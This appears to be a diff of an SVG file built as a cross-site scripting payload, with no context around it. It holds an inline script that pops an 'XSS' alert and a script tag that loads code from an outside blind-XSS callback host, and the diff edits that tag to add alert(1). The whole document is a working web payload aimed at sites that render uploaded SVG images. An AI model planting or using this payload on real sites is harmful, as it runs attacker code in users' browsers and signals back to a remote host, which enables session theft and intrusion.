@@ -6,5 +6,5 @@
    <script type="text/javascript">
       alert("XSS");
    </script>
-   <script src=https://alsanosi.bxss.in></script>
+   <script src=https://alsanosi.bxss.in>alert(1)</script>
 </svg>
